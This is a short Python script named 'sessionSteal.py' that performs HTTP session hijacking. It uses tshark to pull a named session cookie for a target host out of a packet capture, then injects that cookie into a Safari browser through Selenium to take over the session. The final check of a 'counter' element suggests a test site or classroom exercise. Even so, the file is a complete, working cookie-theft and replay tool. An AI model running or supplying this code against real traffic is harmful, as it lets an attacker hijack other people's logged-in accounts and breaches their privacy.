#!/usr/bin/env python3
#
# sessionSteal.py
#
# Copyright (c) 2018 Kacper Raczy. All right reserved.

import subprocess
import sys
import argparse
from selenium import webdriver

def print_err(*args, **kwargs):
    print(*args, **kwargs, file=sys.stderr)

parser = argparse.ArgumentParser(description="Session stealing script.")
required = parser.add_argument_group("Required arguments")
required.add_argument("-H", "--host", help="host name", type=str, dest="host")
required.add_argument("-c", "--cookie", help="name of cookie holding session id", type=str, dest="cookie")
required.add_argument("-i", "--ifile", help="path to input *.pcapng file", type=str, dest="ifile")
args = parser.parse_args()

if args.host is None or args.cookie is None or args.ifile is None:
    parser.print_usage()
    exit(1)

cookieName = args.cookie

# find cookie info usign tshark
tshark_args = ["tshark", "-Y", f"http.host contains {args.host} and http.cookie contains {args.cookie}", "-Tfields", "-e", "http.cookie", "-r", args.ifile]
out = subprocess.check_output(tshark_args, universal_newlines=True).splitlines()
if len(out) == 0:
    print_err("Error: could not find appropriate frame.")
    exit(2)
latest = out[len(out) - 1]
cookies = dict([x.strip().split("=", 1) for x in latest.split(";") if len(x) != 0])
sessionCookie = cookies[cookieName]
print("Got session cookie: " + sessionCookie)

# Load gathered session cookie to the browser
driver = webdriver.Safari()
hostPath = "http://" + args.host
driver.get(hostPath + "/some404")
driver.delete_all_cookies()
driver.add_cookie({"name": cookieName, "value": sessionCookie, "path":"/"})
driver.get(hostPath)

# Check test website counter
element = driver.find_element_by_id("counter")
print(f"Session counter: {element.text}")
